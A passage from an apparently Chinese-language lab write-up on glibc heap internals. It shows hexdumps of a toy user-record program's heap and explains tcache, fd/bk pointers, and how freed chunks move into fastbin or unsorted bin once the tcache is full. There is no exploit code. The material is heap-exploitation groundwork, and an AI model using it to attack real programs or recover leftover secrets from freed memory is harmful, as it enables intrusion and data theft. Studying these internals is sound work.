<a id="__codelineno-0-38" name="__codelineno-0-38"></a><a href="#__codelineno-0-38"><span class="linenos" data-linenos=" 38 "></span></a>00000460  90 64 3b 02 00 00 00 00  3c 62 6c 61 6e 6b 2f 3e  |.d;.....&lt;blank/&gt;|
<a id="__codelineno-0-39" name="__codelineno-0-39"></a><a href="#__codelineno-0-39"><span class="linenos" data-linenos=" 39 "></span></a>00000470  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-40" name="__codelineno-0-40"></a><a href="#__codelineno-0-40"><span class="linenos" data-linenos=" 40 "></span></a>00000480  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-0-41" name="__codelineno-0-41"></a><a href="#__codelineno-0-41"><span class="linenos" data-linenos=" 41 "></span></a>00000490  50 65 3b 02 00 00 00 00  10 60 3b 02 00 00 00 00  |Pe;......`;.....|
<a id="__codelineno-0-42" name="__codelineno-0-42"></a><a href="#__codelineno-0-42"><span class="linenos" data-linenos=" 42 "></span></a>000004a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-43" name="__codelineno-0-43"></a><a href="#__codelineno-0-43"><span class="linenos" data-linenos=" 43 "></span></a>*
<a id="__codelineno-0-44" name="__codelineno-0-44"></a><a href="#__codelineno-0-44"><span class="linenos" data-linenos=" 44 "></span></a>000004d0  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-0-45" name="__codelineno-0-45"></a><a href="#__codelineno-0-45"><span class="linenos" data-linenos=" 45 "></span></a>000004e0  a0 65 3b 02 00 00 00 00  10 60 3b 02 00 00 00 00  |.e;......`;.....|
<a id="__codelineno-0-46" name="__codelineno-0-46"></a><a href="#__codelineno-0-46"><span class="linenos" data-linenos=" 46 "></span></a>000004f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-47" name="__codelineno-0-47"></a><a href="#__codelineno-0-47"><span class="linenos" data-linenos=" 47 "></span></a>00000500  70 34 73 73 77 30 72 64  00 00 00 00 00 00 00 00  |p4ssw0rd........|
<a id="__codelineno-0-48" name="__codelineno-0-48"></a><a href="#__codelineno-0-48"><span class="linenos" data-linenos=" 48 "></span></a>00000510  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-49" name="__codelineno-0-49"></a><a href="#__codelineno-0-49"><span class="linenos" data-linenos=" 49 "></span></a>00000520  50 65 3b 02 00 00 00 00  2e 2e 2e 00 00 00 00 00  |Pe;.............| 
<a id="__codelineno-0-50" name="__codelineno-0-50"></a><a href="#__codelineno-0-50"><span class="linenos" data-linenos=" 50 "></span></a>00000530  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-51" name="__codelineno-0-51"></a><a href="#__codelineno-0-51"><span class="linenos" data-linenos=" 51 "></span></a>00000540  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-0-52" name="__codelineno-0-52"></a><a href="#__codelineno-0-52"><span class="linenos" data-linenos=" 52 "></span></a>00000550  10 66 3b 02 00 00 00 00  10 60 3b 02 00 00 00 00  |.f;......`;.....|
<a id="__codelineno-0-53" name="__codelineno-0-53"></a><a href="#__codelineno-0-53"><span class="linenos" data-linenos=" 53 "></span></a>00000560  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-54" name="__codelineno-0-54"></a><a href="#__codelineno-0-54"><span class="linenos" data-linenos=" 54 "></span></a>*
<a id="__codelineno-0-55" name="__codelineno-0-55"></a><a href="#__codelineno-0-55"><span class="linenos" data-linenos=" 55 "></span></a>00000590  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-0-56" name="__codelineno-0-56"></a><a href="#__codelineno-0-56"><span class="linenos" data-linenos=" 56 "></span></a>000005a0  60 66 3b 02 00 00 00 00  10 60 3b 02 00 00 00 00  |`f;......`;.....|
<a id="__codelineno-0-57" name="__codelineno-0-57"></a><a href="#__codelineno-0-57"><span class="linenos" data-linenos=" 57 "></span></a>000005b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-58" name="__codelineno-0-58"></a><a href="#__codelineno-0-58"><span class="linenos" data-linenos=" 58 "></span></a>000005c0  61 61 61 62 62 62 00 00  00 00 00 00 00 00 00 00  |aaabbb..........|
<a id="__codelineno-0-59" name="__codelineno-0-59"></a><a href="#__codelineno-0-59"><span class="linenos" data-linenos=" 59 "></span></a>000005d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-60" name="__codelineno-0-60"></a><a href="#__codelineno-0-60"><span class="linenos" data-linenos=" 60 "></span></a>000005e0  10 66 3b 02 00 00 00 00  3c 61 6c 65 72 74 3e 00  |.f;.....&lt;alert&gt;.|
<a id="__codelineno-0-61" name="__codelineno-0-61"></a><a href="#__codelineno-0-61"><span class="linenos" data-linenos=" 61 "></span></a>000005f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-62" name="__codelineno-0-62"></a><a href="#__codelineno-0-62"><span class="linenos" data-linenos=" 62 "></span></a>00000600  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-0-63" name="__codelineno-0-63"></a><a href="#__codelineno-0-63"><span class="linenos" data-linenos=" 63 "></span></a>00000610  d0 66 3b 02 00 00 00 00  10 60 3b 02 00 00 00 00  |.f;......`;.....|
<a id="__codelineno-0-64" name="__codelineno-0-64"></a><a href="#__codelineno-0-64"><span class="linenos" data-linenos=" 64 "></span></a>00000620  74 65 72 20 74 68 61 6e  20 75 67 6c 79 00 00 00  |ter than ugly...|
<a id="__codelineno-0-65" name="__codelineno-0-65"></a><a href="#__codelineno-0-65"><span class="linenos" data-linenos=" 65 "></span></a>00000630  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-66" name="__codelineno-0-66"></a><a href="#__codelineno-0-66"><span class="linenos" data-linenos=" 66 "></span></a>*
<a id="__codelineno-0-67" name="__codelineno-0-67"></a><a href="#__codelineno-0-67"><span class="linenos" data-linenos=" 67 "></span></a>00000650  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-0-68" name="__codelineno-0-68"></a><a href="#__codelineno-0-68"><span class="linenos" data-linenos=" 68 "></span></a>00000660  20 67 3b 02 00 00 00 00  10 60 3b 02 00 00 00 00  | g;......`;.....|
<a id="__codelineno-0-69" name="__codelineno-0-69"></a><a href="#__codelineno-0-69"><span class="linenos" data-linenos=" 69 "></span></a>00000670  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-70" name="__codelineno-0-70"></a><a href="#__codelineno-0-70"><span class="linenos" data-linenos=" 70 "></span></a>00000680  6d 61 72 6b 6e 62 31 31  00 00 00 00 00 00 00 00  |marknb11........|
<a id="__codelineno-0-71" name="__codelineno-0-71"></a><a href="#__codelineno-0-71"><span class="linenos" data-linenos=" 71 "></span></a>00000690  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-72" name="__codelineno-0-72"></a><a href="#__codelineno-0-72"><span class="linenos" data-linenos=" 72 "></span></a>000006a0  d0 66 3b 02 00 00 00 00  77 61 74 63 68 20 6f 75  |.f;.....watch ou|
<a id="__codelineno-0-73" name="__codelineno-0-73"></a><a href="#__codelineno-0-73"><span class="linenos" data-linenos=" 73 "></span></a>000006b0  74 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |t...............|
<a id="__codelineno-0-74" name="__codelineno-0-74"></a><a href="#__codelineno-0-74"><span class="linenos" data-linenos=" 74 "></span></a>000006c0  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-0-75" name="__codelineno-0-75"></a><a href="#__codelineno-0-75"><span class="linenos" data-linenos=" 75 "></span></a>000006d0  90 67 3b 02 00 00 00 00  10 60 3b 02 00 00 00 00  |.g;......`;.....|
<a id="__codelineno-0-76" name="__codelineno-0-76"></a><a href="#__codelineno-0-76"><span class="linenos" data-linenos=" 76 "></span></a>000006e0  65 72 20 74 68 61 6e 20  69 6d 70 6c 69 63 69 74  |er than implicit|
<a id="__codelineno-0-77" name="__codelineno-0-77"></a><a href="#__codelineno-0-77"><span class="linenos" data-linenos=" 77 "></span></a>000006f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-78" name="__codelineno-0-78"></a><a href="#__codelineno-0-78"><span class="linenos" data-linenos=" 78 "></span></a>*
<a id="__codelineno-0-79" name="__codelineno-0-79"></a><a href="#__codelineno-0-79"><span class="linenos" data-linenos=" 79 "></span></a>00000710  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-0-80" name="__codelineno-0-80"></a><a href="#__codelineno-0-80"><span class="linenos" data-linenos=" 80 "></span></a>00000720  00 00 00 00 00 00 00 00  10 60 3b 02 00 00 00 00  |.........`;.....|
<a id="__codelineno-0-81" name="__codelineno-0-81"></a><a href="#__codelineno-0-81"><span class="linenos" data-linenos=" 81 "></span></a>00000730  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-82" name="__codelineno-0-82"></a><a href="#__codelineno-0-82"><span class="linenos" data-linenos=" 82 "></span></a>00000740  6d 39 35 30 35 32 34 00  00 00 00 00 00 00 00 00  |m950524.........|
<a id="__codelineno-0-83" name="__codelineno-0-83"></a><a href="#__codelineno-0-83"><span class="linenos" data-linenos=" 83 "></span></a>00000750  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-84" name="__codelineno-0-84"></a><a href="#__codelineno-0-84"><span class="linenos" data-linenos=" 84 "></span></a>00000760  90 67 3b 02 00 00 00 00  5f 5f 5f 5f 5f 5f 5f 5f  |.g;.....________|
<a id="__codelineno-0-85" name="__codelineno-0-85"></a><a href="#__codelineno-0-85"><span class="linenos" data-linenos=" 85 "></span></a>00000770  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-86" name="__codelineno-0-86"></a><a href="#__codelineno-0-86"><span class="linenos" data-linenos=" 86 "></span></a>00000780  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-0-87" name="__codelineno-0-87"></a><a href="#__codelineno-0-87"><span class="linenos" data-linenos=" 87 "></span></a>00000790  00 00 00 00 00 00 00 00  10 60 3b 02 00 00 00 00  |.........`;.....|
<a id="__codelineno-0-88" name="__codelineno-0-88"></a><a href="#__codelineno-0-88"><span class="linenos" data-linenos=" 88 "></span></a>000007a0  6e 74 21 20 76 69 6e 63  65 6e 74 00 00 00 00 00  |nt! vincent.....|
<a id="__codelineno-0-89" name="__codelineno-0-89"></a><a href="#__codelineno-0-89"><span class="linenos" data-linenos=" 89 "></span></a>000007b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-90" name="__codelineno-0-90"></a><a href="#__codelineno-0-90"><span class="linenos" data-linenos=" 90 "></span></a>*
<a id="__codelineno-0-91" name="__codelineno-0-91"></a><a href="#__codelineno-0-91"><span class="linenos" data-linenos=" 91 "></span></a>000007d0  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-0-92" name="__codelineno-0-92"></a><a href="#__codelineno-0-92"><span class="linenos" data-linenos=" 92 "></span></a>000007e0  57 69 6c 6c 69 61 6d 00  00 00 00 00 00 00 00 00  |William.........|
<a id="__codelineno-0-93" name="__codelineno-0-93"></a><a href="#__codelineno-0-93"><span class="linenos" data-linenos=" 93 "></span></a>000007f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-94" name="__codelineno-0-94"></a><a href="#__codelineno-0-94"><span class="linenos" data-linenos=" 94 "></span></a>00000800  77 69 6c 6c 33 32 31 32  33 00 00 00 00 00 00 00  |will32123.......|
<a id="__codelineno-0-95" name="__codelineno-0-95"></a><a href="#__codelineno-0-95"><span class="linenos" data-linenos=" 95 "></span></a>00000810  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-96" name="__codelineno-0-96"></a><a href="#__codelineno-0-96"><span class="linenos" data-linenos=" 96 "></span></a>00000820  50 68 3b 02 00 00 00 00  69 27 6d 20 66 69 6e 65  |Ph;.....i&#39;m fine|
<a id="__codelineno-0-97" name="__codelineno-0-97"></a><a href="#__codelineno-0-97"><span class="linenos" data-linenos=" 97 "></span></a>00000830  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-98" name="__codelineno-0-98"></a><a href="#__codelineno-0-98"><span class="linenos" data-linenos=" 98 "></span></a>00000840  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-0-99" name="__codelineno-0-99"></a><a href="#__codelineno-0-99"><span class="linenos" data-linenos=" 99 "></span></a>00000850  64 47 39 76 62 32 39 76  62 32 39 76 62 32 39 6f  |dG9vb29vb29vb29o|
<a id="__codelineno-0-100" name="__codelineno-0-100"></a><a href="#__codelineno-0-100"><span class="linenos" data-linenos="100 "></span></a>00000860  59 57 35 6b 63 32 39 74  5a 51 3d 3d 00 00 00 00  |YW5kc29tZQ==....|
<a id="__codelineno-0-101" name="__codelineno-0-101"></a><a href="#__codelineno-0-101"><span class="linenos" data-linenos="101 "></span></a>00000870  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-102" name="__codelineno-0-102"></a><a href="#__codelineno-0-102"><span class="linenos" data-linenos="102 "></span></a>*
<a id="__codelineno-0-103" name="__codelineno-0-103"></a><a href="#__codelineno-0-103"><span class="linenos" data-linenos="103 "></span></a>00000890  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-0-104" name="__codelineno-0-104"></a><a href="#__codelineno-0-104"><span class="linenos" data-linenos="104 "></span></a>000008a0  4a 6f 73 65 70 68 00 00  00 00 00 00 00 00 00 00  |Joseph..........|
<a id="__codelineno-0-105" name="__codelineno-0-105"></a><a href="#__codelineno-0-105"><span class="linenos" data-linenos="105 "></span></a>000008b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-106" name="__codelineno-0-106"></a><a href="#__codelineno-0-106"><span class="linenos" data-linenos="106 "></span></a>000008c0  6a 6a 6a 37 38 39 00 00  00 00 00 00 00 00 00 00  |jjj789..........|
<a id="__codelineno-0-107" name="__codelineno-0-107"></a><a href="#__codelineno-0-107"><span class="linenos" data-linenos="107 "></span></a>000008d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-108" name="__codelineno-0-108"></a><a href="#__codelineno-0-108"><span class="linenos" data-linenos="108 "></span></a>000008e0  10 69 3b 02 00 00 00 00  54 65 61 63 68 20 6d 65  |.i;.....Teach me|
<a id="__codelineno-0-109" name="__codelineno-0-109"></a><a href="#__codelineno-0-109"><span class="linenos" data-linenos="109 "></span></a>000008f0  20 61 6e 64 20 49 20 72  65 6d 65 6d 62 65 72 2e  | and I remember.|
<a id="__codelineno-0-110" name="__codelineno-0-110"></a><a href="#__codelineno-0-110"><span class="linenos" data-linenos="110 "></span></a>00000900  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-0-111" name="__codelineno-0-111"></a><a href="#__codelineno-0-111"><span class="linenos" data-linenos="111 "></span></a>00000910  58 44 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |XD..............|
<a id="__codelineno-0-112" name="__codelineno-0-112"></a><a href="#__codelineno-0-112"><span class="linenos" data-linenos="112 "></span></a>00000920  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-113" name="__codelineno-0-113"></a><a href="#__codelineno-0-113"><span class="linenos" data-linenos="113 "></span></a>*
<a id="__codelineno-0-114" name="__codelineno-0-114"></a><a href="#__codelineno-0-114"><span class="linenos" data-linenos="114 "></span></a>00000950  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-0-115" name="__codelineno-0-115"></a><a href="#__codelineno-0-115"><span class="linenos" data-linenos="115 "></span></a>00000960  48 65 72 72 79 00 00 00  00 00 00 00 00 00 00 00  |Herry...........|
<a id="__codelineno-0-116" name="__codelineno-0-116"></a><a href="#__codelineno-0-116"><span class="linenos" data-linenos="116 "></span></a>00000970  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-117" name="__codelineno-0-117"></a><a href="#__codelineno-0-117"><span class="linenos" data-linenos="117 "></span></a>00000980  68 41 42 43 33 32 31 00  00 00 00 00 00 00 00 00  |hABC321.........|
<a id="__codelineno-0-118" name="__codelineno-0-118"></a><a href="#__codelineno-0-118"><span class="linenos" data-linenos="118 "></span></a>00000990  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-119" name="__codelineno-0-119"></a><a href="#__codelineno-0-119"><span class="linenos" data-linenos="119 "></span></a>000009a0  d0 69 3b 02 00 00 00 00  68 61 72 64 2d 77 6f 72  |.i;.....hard-wor|
<a id="__codelineno-0-120" name="__codelineno-0-120"></a><a href="#__codelineno-0-120"><span class="linenos" data-linenos="120 "></span></a>000009b0  6b 69 6e 67 21 00 00 00  00 00 00 00 00 00 00 00  |king!...........|
<a id="__codelineno-0-121" name="__codelineno-0-121"></a><a href="#__codelineno-0-121"><span class="linenos" data-linenos="121 "></span></a>000009c0  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-0-122" name="__codelineno-0-122"></a><a href="#__codelineno-0-122"><span class="linenos" data-linenos="122 "></span></a>000009d0  6e 6f 20 69 6e 74 72 6f  20 61 74 20 61 6c 6c 00  |no intro at all.|
<a id="__codelineno-0-123" name="__codelineno-0-123"></a><a href="#__codelineno-0-123"><span class="linenos" data-linenos="123 "></span></a>000009e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-124" name="__codelineno-0-124"></a><a href="#__codelineno-0-124"><span class="linenos" data-linenos="124 "></span></a>*
<a id="__codelineno-0-125" name="__codelineno-0-125"></a><a href="#__codelineno-0-125"><span class="linenos" data-linenos="125 "></span></a>00000a10  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-0-126" name="__codelineno-0-126"></a><a href="#__codelineno-0-126"><span class="linenos" data-linenos="126 "></span></a>00000a20  47 61 72 79 00 00 00 00  00 00 00 00 00 00 00 00  |Gary............|
<a id="__codelineno-0-127" name="__codelineno-0-127"></a><a href="#__codelineno-0-127"><span class="linenos" data-linenos="127 "></span></a>00000a30  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-128" name="__codelineno-0-128"></a><a href="#__codelineno-0-128"><span class="linenos" data-linenos="128 "></span></a>00000a40  67 67 77 70 32 30 32 34  00 00 00 00 00 00 00 00  |ggwp2024........|
<a id="__codelineno-0-129" name="__codelineno-0-129"></a><a href="#__codelineno-0-129"><span class="linenos" data-linenos="129 "></span></a>00000a50  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-130" name="__codelineno-0-130"></a><a href="#__codelineno-0-130"><span class="linenos" data-linenos="130 "></span></a>00000a60  90 6a 3b 02 00 00 00 00  49 20 6e 65 76 65 72 20  |.j;.....I never |
<a id="__codelineno-0-131" name="__codelineno-0-131"></a><a href="#__codelineno-0-131"><span class="linenos" data-linenos="131 "></span></a>00000a70  77 61 6c 6b 20 62 61 63  6b 77 61 72 64 73 2e 00  |walk backwards..|
<a id="__codelineno-0-132" name="__codelineno-0-132"></a><a href="#__codelineno-0-132"><span class="linenos" data-linenos="132 "></span></a>00000a80  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-0-133" name="__codelineno-0-133"></a><a href="#__codelineno-0-133"><span class="linenos" data-linenos="133 "></span></a>00000a90  74 68 65 20 62 65 73 74  20 67 61 72 79 20 69 6e  |the best gary in|
<a id="__codelineno-0-134" name="__codelineno-0-134"></a><a href="#__codelineno-0-134"><span class="linenos" data-linenos="134 "></span></a>00000aa0  20 74 68 65 20 77 6f 72  6c 64 00 00 00 00 00 00  | the world......|
<a id="__codelineno-0-135" name="__codelineno-0-135"></a><a href="#__codelineno-0-135"><span class="linenos" data-linenos="135 "></span></a>00000ab0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-136" name="__codelineno-0-136"></a><a href="#__codelineno-0-136"><span class="linenos" data-linenos="136 "></span></a>*
<a id="__codelineno-0-137" name="__codelineno-0-137"></a><a href="#__codelineno-0-137"><span class="linenos" data-linenos="137 "></span></a>00000ad0  00 00 00 00 00 00 00 00  31 05 02 00 00 00 00 00  |........1.......|
<a id="__codelineno-0-138" name="__codelineno-0-138"></a><a href="#__codelineno-0-138"><span class="linenos" data-linenos="138 "></span></a>00000ae0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-0-139" name="__codelineno-0-139"></a><a href="#__codelineno-0-139"><span class="linenos" data-linenos="139 "></span></a>*
<a id="__codelineno-0-140" name="__codelineno-0-140"></a><a href="#__codelineno-0-140"><span class="linenos" data-linenos="140 "></span></a>00001000
</code></pre></div>
<h4 id="_3">内存管理示意图<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h4>
<p>​   如图所示为内存管理的示意图。图中每个由0x70的chunk+0x50的组成的内存空间为一个user的空间，其中每个0x70的chunk中存储了一个指向0x50的chunk的指针，即程序中的<code>intro</code>指针，在图中用绿色箭头表示。图中前7个user空间的内存已经被释放，bk指针全部指向最上方的0x023b6010，即tcache管理<code>tcache_perthread_struct</code> 的堆块，图中为最右侧的红色箭头。对于每一个被释放的chunk，其中的fd指针指向下一个size相同的被释放的chunk，直到最后一个fd指针为空，图中用左侧的红色箭头表示（0x50和0x70分别依次链接）。</p>
<p><img alt="2" src="pic/2.jpg" /></p>
<h3 id="3">实践3<a class="headerlink" href="#3" title="Permanent link">&para;</a></h3>
<p>​   以下为新生成的bin文件，可见free掉的<code>William</code> 和 <code>Joseph</code>的内存块中bk指针位置为空。由计算可知，先前释放的7块内存将tcache中的0x50和0x70模块填满，<code>William</code> 和 <code>Joseph</code>的堆块没有存储位置，不再位于tcache链表上，而是按照传统的堆内存处理方式，被放到了 fastbin 或者 unsorted bin 中。</p>
<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1"></a><a href="#__codelineno-1-1"><span class="linenos" data-linenos="  1 "></span></a>00000000  00 00 00 00 00 00 00 00  91 02 00 00 00 00 00 00  |................|
<a id="__codelineno-1-2" name="__codelineno-1-2"></a><a href="#__codelineno-1-2"><span class="linenos" data-linenos="  2 "></span></a>00000010  00 00 00 00 00 00 07 00  00 00 07 00 00 00 00 00  |................|
<a id="__codelineno-1-3" name="__codelineno-1-3"></a><a href="#__codelineno-1-3"><span class="linenos" data-linenos="  3 "></span></a>00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-4" name="__codelineno-1-4"></a><a href="#__codelineno-1-4"><span class="linenos" data-linenos="  4 "></span></a>*
<a id="__codelineno-1-5" name="__codelineno-1-5"></a><a href="#__codelineno-1-5"><span class="linenos" data-linenos="  5 "></span></a>000000a0  00 00 00 00 00 00 00 00  10 63 84 01 00 00 00 00  |.........c......|
<a id="__codelineno-1-6" name="__codelineno-1-6"></a><a href="#__codelineno-1-6"><span class="linenos" data-linenos="  6 "></span></a>000000b0  00 00 00 00 00 00 00 00  a0 62 84 01 00 00 00 00  |.........b......|
<a id="__codelineno-1-7" name="__codelineno-1-7"></a><a href="#__codelineno-1-7"><span class="linenos" data-linenos="  7 "></span></a>000000c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-8" name="__codelineno-1-8"></a><a href="#__codelineno-1-8"><span class="linenos" data-linenos="  8 "></span></a>*
<a id="__codelineno-1-9" name="__codelineno-1-9"></a><a href="#__codelineno-1-9"><span class="linenos" data-linenos="  9 "></span></a>00000290  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-1-10" name="__codelineno-1-10"></a><a href="#__codelineno-1-10"><span class="linenos" data-linenos=" 10 "></span></a>000002a0  60 63 84 01 00 00 00 00  10 60 84 01 00 00 00 00  |`c.......`......|
<a id="__codelineno-1-11" name="__codelineno-1-11"></a><a href="#__codelineno-1-11"><span class="linenos" data-linenos=" 11 "></span></a>000002b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-12" name="__codelineno-1-12"></a><a href="#__codelineno-1-12"><span class="linenos" data-linenos=" 12 "></span></a>000002c0  31 32 33 34 35 36 00 00  00 00 00 00 00 00 00 00  |123456..........|
<a id="__codelineno-1-13" name="__codelineno-1-13"></a><a href="#__codelineno-1-13"><span class="linenos" data-linenos=" 13 "></span></a>000002d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-14" name="__codelineno-1-14"></a><a href="#__codelineno-1-14"><span class="linenos" data-linenos=" 14 "></span></a>000002e0  10 63 84 01 00 00 00 00  74 72 79 20 65 76 65 72  |.c......try ever|
<a id="__codelineno-1-15" name="__codelineno-1-15"></a><a href="#__codelineno-1-15"><span class="linenos" data-linenos=" 15 "></span></a>000002f0  79 74 68 69 6e 67 00 00  00 00 00 00 00 00 00 00  |ything..........|
<a id="__codelineno-1-16" name="__codelineno-1-16"></a><a href="#__codelineno-1-16"><span class="linenos" data-linenos=" 16 "></span></a>00000300  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-1-17" name="__codelineno-1-17"></a><a href="#__codelineno-1-17"><span class="linenos" data-linenos=" 17 "></span></a>00000310  d0 63 84 01 00 00 00 00  10 60 84 01 00 00 00 00  |.c.......`......|
<a id="__codelineno-1-18" name="__codelineno-1-18"></a><a href="#__codelineno-1-18"><span class="linenos" data-linenos=" 18 "></span></a>00000320  6d 20 62 6f 62 00 00 00  00 00 00 00 00 00 00 00  |m bob...........|
<a id="__codelineno-1-19" name="__codelineno-1-19"></a><a href="#__codelineno-1-19"><span class="linenos" data-linenos=" 19 "></span></a>00000330  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-20" name="__codelineno-1-20"></a><a href="#__codelineno-1-20"><span class="linenos" data-linenos=" 20 "></span></a>*
<a id="__codelineno-1-21" name="__codelineno-1-21"></a><a href="#__codelineno-1-21"><span class="linenos" data-linenos=" 21 "></span></a>00000350  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-1-22" name="__codelineno-1-22"></a><a href="#__codelineno-1-22"><span class="linenos" data-linenos=" 22 "></span></a>00000360  20 64 84 01 00 00 00 00  10 60 84 01 00 00 00 00  | d.......`......|
<a id="__codelineno-1-23" name="__codelineno-1-23"></a><a href="#__codelineno-1-23"><span class="linenos" data-linenos=" 23 "></span></a>00000370  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-24" name="__codelineno-1-24"></a><a href="#__codelineno-1-24"><span class="linenos" data-linenos=" 24 "></span></a>00000380  36 35 34 33 32 31 00 00  00 00 00 00 00 00 00 00  |654321..........|
<a id="__codelineno-1-25" name="__codelineno-1-25"></a><a href="#__codelineno-1-25"><span class="linenos" data-linenos=" 25 "></span></a>00000390  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-26" name="__codelineno-1-26"></a><a href="#__codelineno-1-26"><span class="linenos" data-linenos=" 26 "></span></a>000003a0  d0 63 84 01 00 00 00 00  65 61 74 20 6d 6f 72 65  |.c......eat more|
<a id="__codelineno-1-27" name="__codelineno-1-27"></a><a href="#__codelineno-1-27"><span class="linenos" data-linenos=" 27 "></span></a>000003b0  20 76 65 67 65 74 61 62  6c 65 73 00 00 00 00 00  | vegetables.....|
<a id="__codelineno-1-28" name="__codelineno-1-28"></a><a href="#__codelineno-1-28"><span class="linenos" data-linenos=" 28 "></span></a>000003c0  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-1-29" name="__codelineno-1-29"></a><a href="#__codelineno-1-29"><span class="linenos" data-linenos=" 29 "></span></a>000003d0  90 64 84 01 00 00 00 00  10 60 84 01 00 00 00 00  |.d.......`......|
<a id="__codelineno-1-30" name="__codelineno-1-30"></a><a href="#__codelineno-1-30"><span class="linenos" data-linenos=" 30 "></span></a>000003e0  6d 20 61 6c 69 63 65 00  00 00 00 00 00 00 00 00  |m alice.........|
<a id="__codelineno-1-31" name="__codelineno-1-31"></a><a href="#__codelineno-1-31"><span class="linenos" data-linenos=" 31 "></span></a>000003f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-32" name="__codelineno-1-32"></a><a href="#__codelineno-1-32"><span class="linenos" data-linenos=" 32 "></span></a>*
